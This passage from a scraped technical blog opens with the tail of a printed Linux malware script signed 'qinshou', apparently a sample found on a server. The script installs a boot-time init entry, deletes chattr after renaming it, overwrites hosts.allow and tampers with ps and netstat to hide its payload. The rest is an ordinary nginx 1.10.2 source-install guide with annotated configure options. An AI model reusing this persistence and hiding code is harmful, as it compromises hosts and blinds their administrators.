class="variable">$Ftempbash</span>&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Required-Start: &quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Required-Stop:  &quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Default-Start:  1 2 3 4 5&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Default-Stop:   &quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Short-Description:  <span class="variable">$Ftempbash</span>&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;### END INIT INFO&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;case $1 in&#x27;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;start)&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  <span class="variable">$Fbashpath</span>&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  ;;&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;stop)&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  ;;&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*)&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  <span class="variable">$Fbashpath</span>&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  ;;&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;esac&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line">zfgsr -ia <span class="variable">$Fconfig</span>;zfgsr -ia <span class="variable">$0</span>;zfgsr -ia <span class="variable">$Fbashpath</span></span><br><span class="line">sed -i <span class="string">&quot;s|<span class="variable">$Ftempbash</span>|<span class="variable">$Fbashname</span>|&quot;</span> <span class="variable">$Fconfig</span></span><br><span class="line">zfgsr +ia <span class="variable">$Fconfig</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="built_in">cp</span> -f <span class="variable">$0</span> <span class="variable">$Fbashpath</span>;<span class="built_in">rm</span> -f <span class="variable">$0</span>;<span class="built_in">chmod</span> 0755 <span class="variable">$Fbashpath</span></span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;`<span class="variable">$S99</span>|grep &quot;</span><span class="variable">$Fbashtemp</span><span class="string">&quot;`&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">sed -i <span class="string">&quot;s|<span class="variable">$Ftempbash</span>|<span class="variable">$Fbashname</span>|&quot;</span> <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="variable">$S99</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line">zfgsr -ia /usr/bin/chattr;<span class="built_in">rm</span> -f /usr/bin/chattr</span><br><span class="line">zfgsr -ia /etc/hosts.allow;<span class="built_in">cp</span> -f <span class="variable">$allow</span> /etc/hosts.allow;zfgsr +ia /etc/hosts.allow &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="built_in">sleep</span> 1;zfgsr -ia <span class="variable">$Fbashpath</span>;<span class="built_in">chmod</span> 0755 <span class="variable">$Fbashpath</span>;<span class="built_in">nohup</span> <span class="variable">$Fbashpath</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line">zfgsr -ia /bin/ps;sed -i <span class="string">&quot;s|<span class="variable">$Ftempbash</span>|<span class="variable">$Fbashname</span>|&quot;</span> /bin/ps</span><br><span class="line">zfgsr -ia /bin/netstat;<span class="built_in">chmod</span> 0755 /bin/netstat;<span class="built_in">chmod</span> 0755 /bin/ps</span><br><span class="line">zfgsr +ia /bin/netstat &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia /bin/ps &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/15/2018/12/2018-12-15-nginx1-10-2%E7%A8%B3%E5%AE%9A%E7%89%88%E6%9C%ACtcp%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E7%95%A5%E8%A7%A3/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/15/2018/12/2018-12-15-nginx1-10-2%E7%A8%B3%E5%AE%9A%E7%89%88%E6%9C%ACtcp%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E7%95%A5%E8%A7%A3/index/" class="post-title-link" itemprop="url">Nginx1.10.2稳定版本tcp四层负载安装配置过程略解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-15 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-15T08:00:00+08:00">2018-12-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Nginx1.10.2（2016.10.18）是最新稳定版，适合线上运行，最新开发版为1.11.8（2016.12.27） 系统版本CentOS6.8 64位，所有依赖都是系统rpm包，由于epel-release的nginx包不是最新的稳定版本所以选择源码包安装nginx通过源码编译安装 参考资料 <a target="_blank" rel="noopener" href="https://www.biaodianfu.com/centos-7-2-install-nginx-1-10-2.html">https://www.biaodianfu.com/centos-7-2-install-nginx-1-10-2.html</a></p>
<h4 id="1、安装编译所需工具"><a href="#1、安装编译所需工具" class="headerlink" title="1、安装编译所需工具"></a><strong>1、安装编译所需工具</strong></h4><p>yum groupinstall “Development Tools” yum install wget</p>
<h4 id="2、到官网下载最新的源代码（https-nginx-org-en-）"><a href="#2、到官网下载最新的源代码（https-nginx-org-en-）" class="headerlink" title="2、到官网下载最新的源代码（https://nginx.org/en/）"></a><strong>2、到官网下载最新的源代码（<a target="_blank" rel="noopener" href="https://nginx.org/en/%EF%BC%89">https://nginx.org/en/）</a></strong></h4><p>cd &#x2F;usr&#x2F;local&#x2F;src wget <a target="_blank" rel="noopener" href="http://nginx.org/download/nginx-1.10.2.tar.gz">http://nginx.org/download/nginx-1.10.2.tar.gz</a> tar zxvf nginx-1.10.2.tar.gz</p>
<h4 id="3、安装依赖包"><a href="#3、安装依赖包" class="headerlink" title="3、安装依赖包"></a><strong>3、安装依赖包</strong></h4><p>yum install zlib-devel openssl-devel pcre-devel zlib: 为nginx提供gzip模块，需要zlib库支持，传输数据打包，省流量（但消耗资源） openssl: 为nginx提供ssl功能 pcre: 为支持地址重写rewrite功能</p>
<h4 id="4、创建用来运行nginx的用户及组"><a href="#4、创建用来运行nginx的用户及组" class="headerlink" title="4、创建用来运行nginx的用户及组"></a><strong>4、创建用来运行nginx的用户及组</strong></h4><p>groupadd -g 58 www useradd -u 58 -g 58 -M www -s &#x2F;sbin&#x2F;nologin -g参数为www用户指定了一个组。-M参数保证其不 自动生成home目录。</p>
<h4 id="5、编译源代码"><a href="#5、编译源代码" class="headerlink" title="5、编译源代码"></a><strong>5、编译源代码</strong></h4><p>先使用.&#x2F;configure –help 查看编译帮助： 我的线上编译参数，默认开启的不用写 .&#x2F;configure –with-http_ssl_module –with-http_v2_module –with-http_realip_module –with-http_stub_status_module –with-stream –with-stream_ssl_module –with-pcre</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">./configure --help</span><br><span class="line"></span><br><span class="line">  --help                             print this message</span><br><span class="line"></span><br><span class="line">  --prefix=PATH                      set installation prefix #Nginx安装的根路径,默认为 /usr/local/nginx。</span><br><span class="line">  --sbin-path=PATH                   set nginx binary pathname #指定nginx二进制文件的路径,默认为PATH/sbin/nginx。</span><br><span class="line">  --modules-path=PATH                set modules path #Perl模块位置</span><br><span class="line">  --conf-path=PATH                   set nginx.conf pathname #设定nginx配置文件地址，默认为PATH/conf/nginx.conf。</span><br><span class="line">  --error-log-path=PATH              set error log pathname #错误文件路径，默认为 PATH/logs/error.log。</span><br><span class="line">  --pid-path=PATH                    set nginx.pid pathname # master进程pid写入的文件位置,通常在var/run下，默认为 PATH/logs/nginx.pid。</span><br><span class="line">  --lock-path=PATH                   set nginx.lock pathname #共享存储器互斥锁文件路径</span><br><span class="line"></span><br><span class="line">  --user=USER                        set non-privileged user for worker processes #指定程序运行时的非特权用户</span><br><span class="line">  --group=GROUP                      set non-privileged group for worker processes #指定程序运行时的非特权用户组</span><br><span class="line"></span><br><span class="line">  --build=NAME                       set build name #编译名称</span><br><span class="line">  --builddir=DIR                     set build directory #指向编译目录</span><br><span class="line"></span><br><span class="line">  --with-select_module               enable select module 允许或不允许开启SELECT模式，如果configure没有找到合适的模式，比如，kqueue(sun os)、epoll(linux kenel 2.6+)、rtsig(实时信号)</span><br><span class="line">  --without-select_module            disable select module 禁用select模块支持</span><br><span class="line">  --with-poll_module                 enable poll module 启用poll模块支持（功能与select相同，与select特性相同，为一种轮询模式,不推荐在高载环境下使用）</span><br><span class="line">  --without-poll_module              disable poll module 禁用poll模块支持</span><br><span class="line"></span><br><span class="line">  --with-threads                     enable thread pool support</span><br><span class="line"></span><br><span class="line">  --with-file-aio                    enable file AIO support #为freeBSD4.3+和linux2.6.22+系统启用异步io</span><br><span class="line"></span><br><span class="line">  --with-ipv6                        enable IPv6 support #启用ipv6支持</span><br><span class="line"></span><br><span class="line">#默认禁用的模块</span><br><span class="line">  --with-http_ssl_module             enable ngx_http_ssl_module #使支持https请求，需已安装openssl</span><br><span class="line">  --with-http_v2_module              enable ngx_http_v2_module #启用HTTP V2</span><br><span class="line">  --with-http_realip_module          enable ngx_http_realip_module #此模块支持显示真实来源IP地址，主要用于NGINX做前端负载均衡服务器使用</span><br><span class="line">  --with-http_addition_module        enable ngx_http_addition_module #输出过滤器,使你能够在请求经过一个location前或后时在该location本身添加内容</span><br><span class="line">  --with-http_xslt_module            enable ngx_http_xslt_module #这个模块是一个过滤器，它可以通过XSLT模板转换XML应答</span><br><span class="line">  --with-http_xslt_module=dynamic    enable dynamic ngx_http_xslt_module </span><br><span class="line">  --with-http_image_filter_module    enable ngx_http_image_filter_module #图像过滤器,在将图像投递到客户之前进行处理(需要libgd库)</span><br><span class="line">  --with-http_image_filter_module=dynamic</span><br><span class="line">                                     enable dynamic ngx_http_image_filter_module </span><br><span class="line">  --with-http_geoip_module           enable ngx_http_geoip_module #创建基于与MaxMind GeoIP相配的客户端地址</span><br><span class="line">  --with-http_geoip_module=dynamic   enable dynamic ngx_http_geoip_module</span><br><span class="line">  --with-http_sub_module             enable ngx_http_sub_module #这个模块可以能够在nginx的应答中搜索并替换文本</span><br><span class="line">  --with-http_dav_module             enable ngx_http_dav_module #为文件和目录指定权限，限制不同类型的用户对于页面有不同的操作权限</span><br><span class="line">  --with-http_flv_module             enable ngx_http_flv_module #这个模块支持对FLV（flash）文件的拖动播放</span><br><span class="line">  --with-http_mp4_module             enable ngx_http_mp4_module #支持H.264/AAC文件为伪流媒体</span><br><span class="line">  --with-http_gunzip_module          enable ngx_http_gunzip_module #对于不支持gzip编码的客户,该模块用于为客户解压缩预压缩内容</span><br><span class="line">  --with-http_gzip_static_module     enable ngx_http_gzip_static_module #这个模块在一个预压缩文件传送到开启Gzip压缩的客户端之前检查是否已经存在以“.gz”结尾的压缩文件，这样可以防止文件被重复压缩</span><br><span class="line">  --with-http_auth_request_module    enable ngx_http_auth_request_module </span><br><span class="line">  --with-http_random_index_module    enable ngx_http_random_index_module #从目录中选择一个随机主页</span><br><span class="line">  --with-http_secure_link_module     enable ngx_http_secure_link_module #该模块提供一种机制,它会将一个哈希值链接到一个url中,因此,只有那些使用正确的密码能够计算链接</span><br><span class="line">  --with-http_degradation_module     enable ngx_http_degradation_module #允许在内存不足的情况下返回204或444码</span><br><span class="line">  --with-http_slice_module           enable ngx_http_slice_module </span><br><span class="line">  --with-http_stub_status_module     enable ngx_http_stub_status_module #取得一些nginx的运行状态，输出的状态信息可使用RRDtool或类似的工具绘制成图</span><br><span class="line">#默认启用的模块</span><br><span class="line">  --without-http_charset_module      disable ngx_http_charset_module #重新编码web页面</span><br><span class="line">  --without-http_gzip_module         disable ngx_http_gzip_module #同-with-http_gzip_static_module功能一样</span><br><span class="line">  --without-http_ssi_module          disable ngx_http_ssi_module #提供在输入端处理处理服务器包含文件（SSI）的过滤器，目前支持SSI命令的列表是不完整的</span><br><span class="line">  --without-http_userid_module       disable ngx_http_userid_module #用来处理用来确定客户端后续请求的cookies</span><br><span class="line">  --without-http_access_module       disable ngx_http_access_module #供了一个简单的基于主机的访问控制。允许/拒绝基于ip地址</span><br><span class="line">  --without-http_auth_basic_module   disable ngx_http_auth_basic_module #可以使用用户名和密码基于http基本认证方法来保护你的站点或其部分内容</span><br><span class="line">  --without-http_autoindex_module    disable ngx_http_autoindex_module #自动生成目录列表，只在ngx_http_index_module模块未找到索引文件时发出请求。</span><br><span class="line">  --without-http_geo_module          disable ngx_http_geo_module #创建一些变量，其值依赖于客户端的IP地址</span><br><span class="line">  --without-http_map_module          disable ngx_http_map_module #使用任意的键/值对设置配置变量</span><br><span class="line">  --without-http_split_clients_module disable ngx_http_split_clients_module #用来基于某些条件划分用户。条件如：ip地址、报头、cookies等等</span><br><span class="line">  --without-http_referer_module      disable ngx_http_referer_module #用来过滤请求，拒绝报头中Referer值不正确的请求</span><br><span class="line">  --without-http_rewrite_module      disable ngx_http_rewrite_module #允许使用正则表达式改变URI，并且根据变量来转向以及选择配置</span><br><span class="line">  --without-http_proxy_module        disable ngx_http_proxy_module #有关代理服务器</span><br><span class="line">  --without-http_fastcgi_module      disable ngx_http_fastcgi_module #允许Nginx 与FastCGI 进程交互，并通过传递参数来控制FastCGI 进程工作。</span><br><span class="line">  --without-http_uwsgi_module        disable ngx_http_uwsgi_module #用来使用uwsgi协议，uWSGI服务器相关</span><br><span class="line">  --without-http_scgi_module         disable ngx_http_scgi_module #用来启用SCGI协议支持，SCGI协议是CGI协议的替代。</span><br><span class="line">  --without-http_memcached_module    disable ngx_http_memcached_module #用来提供简单的缓存，以提高系统效率</span><br><span class="line">  --without-http_limit_conn_module   disable ngx_http_limit_conn_module #允许你对于一个地址进行连接数的限制用一个给定的session或一个特定的事件</span><br><span class="line">  --without-http_limit_req_module    disable ngx_http_limit_req_module #允许你对于一个地址进行请求数量的限制用一个给定的session或一个特定的事件</span><br><span class="line">  --without-http_empty_gif_module    disable ngx_http_empty_gif_module #在内存中常驻了一个1*1的透明GIF图像，可以被非常快速的调用</span><br><span class="line">  --without-http_browser_module      disable ngx_http_browser_module #用来创建依赖于请求报头的值</span><br><span class="line">  --without-http_upstream_hash_module</span><br><span class="line">                                     disable ngx_http_upstream_hash_module #用于简单的负载均衡</span><br><span class="line">  --without-http_upstream_ip_hash_module</span><br><span class="line">                                     disable ngx_http_upstream_ip_hash_module </span><br><span class="line">  --without-http_upstream_least_conn_module</span><br><span class="line">                                     disable ngx_http_upstream_least_conn_module </span><br><span class="line">  --without-http_upstream_keepalive_module</span><br><span class="line">                                     disable ngx_http_upstream_keepalive_module</span><br><span class="line">  --without-http_upstream_zone_module</span><br><span class="line">                                     disable ngx_http_upstream_zone_module</span><br><span class="line"></span><br><span class="line">  --with-http_perl_module            enable ngx_http_perl_module #这个模块允许nginx使用SSI调用perl或直接执行perl(使用会降低性能)</span><br><span class="line">  --with-http_perl_module=dynamic    enable dynamic ngx_http_perl_module</span><br><span class="line">  --with-perl_modules_path=PATH      set Perl modules path #设定perl模块路径</span><br><span class="line">  --with-perl=PATH                   set perl binary pathname #设定perl库文件路径</span><br><span class="line"></span><br><span class="line">  --http-log-path=PATH               set http access log pathname #设定access log路径</span><br><span class="line">  --http-client-body-temp-path=PATH  set path to store http client request body temporary files #设定http客户端请求临时文件路径</span><br><span class="line">  --http-proxy-temp-path=PATH        set path to store http proxy temporary files #设定http代理临时文件路径</span><br><span class="line">  --http-fastcgi-temp-path=PATH      set path to store http fastcgi temporary files #设定http fastcgi临时文件路径</span><br><span class="line">  --http-uwsgi-temp-path=PATH        set path to store http uwsgi temporary files #设定http uwsgi临时文件路径</span><br><span class="line">  --http-scgi-temp-path=PATH         set path to store http scgi temporary files #设定http scgi临时文件路径</span><br><span class="line"></span><br><span class="line">  --without-http                     disable HTTP server #完全禁用http模块,如果只想支持mall,可以使用此项设置</span><br><span class="line">  --without-http-cache               disable HTTP cache #在使用upstream模块时,nginx能够配置本地缓存内容,此选项可禁用缓存</span><br><span class="line"></span><br><span class="line">  --with-mail                        enable POP3/IMAP4/SMTP proxy module #激活POP3/IMAP4/SMTP代理模块,默认未激活</span><br><span class="line">  --with-mail=dynamic                enable dynamic POP3/IMAP4/SMTP proxy module</span><br><span class="line">  --with-mail_ssl_module             enable ngx_mail_ssl_module #SMTP可以使用SSL／TLS.配置已经定义了HTTP SSL模块，但是不支持客户端证书检测</span><br><span class="line">  --without-mail_pop3_module         disable ngx_mail_pop3_module #启用mail模块后,单独禁用pop3模块</span><br><span class="line">  --without-mail_imap_module         disable ngx_mail_imap_module #启用mail模块后,单独禁用imap模块</span><br><span class="line">  --without-mail_smtp_module         disable ngx_mail_smtp_module #启用mail模块后,单独禁用smtp模块</span><br><span class="line"></span><br><span class="line">  --with-stream                      enable TCP/UDP proxy module</span><br><span class="line">  --with-stream=dynamic              enable dynamic TCP/UDP proxy module</span><br><span class="line">  --with-stream_ssl_module           enable ngx_stream_ssl_module</span><br><span class="line">  --without-stream_limit_conn_module disable ngx_stream_limit_conn_module</span><br><span class="line">  --without-stream_access_module     disable ngx_stream_access_module</span><br><span class="line">  --without-stream_upstream_hash_module</span><br><span class="line">                                     disable ngx_stream_upstream_hash_module</span><br><span class="line">  --without-stream_upstream_least_conn_module</span><br><span class="line">                                     disable ngx_stream_upstream_least_conn_module</span><br><span class="line">  --without-stream_upstream_zone_module</span><br><span class="line">                                     disable ngx_stream_upstream_zone_module</span><br><span class="line"></span><br><span class="line">  --with-google_perftools_module     enable ngx_google_perftools_module #调试用，剖析程序性能瓶颈</span><br><span class="line">  --with-cpp_test_module             enable ngx_cpp_test_module</span><br><span class="line"></span><br><span class="line">  --add-module=PATH                  enable external module #启用外部模块支持</span><br><span class="line">  --add-dynamic-module=PATH          enable dynamic external module</span><br><span class="line">#编译相关的参数</span><br><span class="line">  --with-cc=PATH                     set C compiler pathname #如果想设置一个不在默认path下的c编译器</span><br><span class="line">  --with-cpp=PATH                    set C preprocessor pathname #设置c预处理器的相对路径</span><br><span class="line">  --with-cc-opt=OPTIONS              set additional C compiler options #设置C编译器参数</span><br><span class="line">  --with-ld-opt=OPTIONS              set additional linker options #包含连接库的路径和运行路径</span><br><span class="line">  --with-cpu-opt=CPU                 build for the specified CPU, valid values:pentium, pentiumpro, pentium3, pentium4,athlon, opteron, sparc32, sparc64, ppc64 #指定编译的CPU</span><br><span class="line"></span><br><span class="line">  --without-pcre                     disable PCRE library usage #禁用pcre库</span><br><span class="line">  --with-pcre                        force PCRE library usage #启用pcre库</span><br><span class="line">  --with-pcre=DIR                    set path to PCRE library sources #指向pcre库文件目录</span><br><span class="line">  --with-pcre-opt=OPTIONS            set additional build options for PCRE #在编译时为pcre库设置附加参数</span><br><span class="line">  --with-pcre-jit                    build PCRE with JIT compilation support</span><br><span class="line"></span><br><span class="line">  --with-md5=DIR                     set path to md5 library sources #指向md5库文件目录</span><br><span class="line">  --with-md5-opt=OPTIONS             set additional build options for md5 #在编译时为md5库设置附加参数</span><br><span class="line">  --with-md5-asm                     use md5 assembler sources #使用md5汇编源</span><br><span class="line"></span><br><span class="line">  --with-sha1=DIR                    set path to sha1 library sources #指向sha1库目录</span><br><span class="line">  --with-sha1-opt=OPTIONS            set additional build options for sha1 #在编译时为sha1库设置附加参数</span><br><span class="line">  --with-sha1-asm                    use sha1 assembler sources #使用sha1汇编源</span><br><span class="line"></span><br><span class="line">  --with-zlib=DIR                    set path to zlib library sources #指向zlib库目录</span><br><span class="line">  --with-zlib-opt=OPTIONS            set additional build options for zlib #在编译时为zlib设置附加参数</span><br><span class="line">  --with-zlib-asm=CPU                use zlib assembler sources optimized for the specified CPU, valid values: pentium, pentiumpro #为指定的CPU使用zlib汇编源进行优化</span><br><span class="line"></span><br><span class="line">  --with-libatomic                   force libatomic_ops library usage # 为原子内存的更新操作的实现提供一个架构</span><br><span class="line">  --with-libatomic=DIR               set path to libatomic_ops library sources #指向libatomic_ops安装目录</span><br><span class="line"></span><br><span class="line">  --with-openssl=DIR                 set path to OpenSSL library sources #指向openssl安装目录</span><br><span class="line">  --with-openssl-opt=OPTIONS         set additional build options for OpenSSL #在编译时为openssl设置附加参数</span><br><span class="line"></span><br><span class="line">  --with-debug                       enable debug logging #启用debug日志</span><br></pre></td></tr></table></figure>

<h4 id="6、编译汇总"><a href="#6、编译汇总" class="headerlink" title="6、编译汇总"></a><strong>6、编译汇总</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Configuration summary</span><br><span class="line">+ using system PCRE library</span><br><span class="line">+ using system OpenSSL library</span><br><span class="line">+ md5: using OpenSSL library</span><br><span class="line">+ sha1: using OpenSSL library</span><br><span class="line">+ using system zlib library</span><br><span class="line">nginx path prefix: &quot;/usr/local/nginx&quot;</span><br><span class="line">nginx binary file: &quot;/usr/local/nginx/sbin/nginx&quot;</span><br><span class="line">nginx modules path: &quot;/usr/local/nginx/modules&quot;</span><br><span class="line">nginx configuration prefix: &quot;/usr/local/nginx/conf&quot;</span><br><span class="line">nginx configuration file: &quot;/usr/local/nginx/conf/nginx.conf&quot;</span><br><span class="line">nginx pid file: &quot;/usr/local/nginx/logs/nginx.pid&quot;</span><br><span class="line">nginx error log file: &quot;/usr/local/nginx/logs/error.log&quot;</span><br><span class="line">nginx http access log file: &quot;/usr/local/nginx/logs/access.log&quot;</span><br><span class="line">nginx http client request body temporary files: &quot;client_body_temp&quot;</span><br><span class="line">nginx http proxy temporary files: &quot;proxy_temp&quot;</span><br><span class="line">nginx http fastcgi temporary files: &quot;fastcgi_temp&quot;</span><br><span class="line">nginx http uwsgi temporary files: &quot;uwsgi_temp&quot;</span><br><span class="line">nginx http scgi temporary files: &quot;scgi_temp&quot;</span><br></pre></td></tr></table></figure>

<h4 id="7、编译安装"><a href="#7、编译安装" class="headerlink" title="7、编译安装"></a><strong>7、编译安装</strong></h4><p>编译 make 安装 make install 加入PATH<br>ln -s &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;sbin&#x2F;nginx 核查版本信息 nginx -V nginx version: nginx&#x2F;1.10.2 built by gcc 4.4.7 20120313 (Red Hat 4.4.7-17) (GCC) built with OpenSSL 1.0.1e-fips 11 Feb 2013 TLS SNI support enabled configure arguments: –with-http_ssl_module –with-http_v2_module –with-http_realip_module –with-http_stub_status_module –with-stream –with-stream_ssl_module –with-pcre</p>
<h4 id="8、简单配置"><a href="#8、简单配置" class="headerlink" title="8、简单配置"></a><strong>8、简单配置</strong></h4><p>我这次主要使用到tcp四层负载，后续可能涉及到https http2等，所以编译时添加了那些参数。 nginx.conf配置如下：</p>
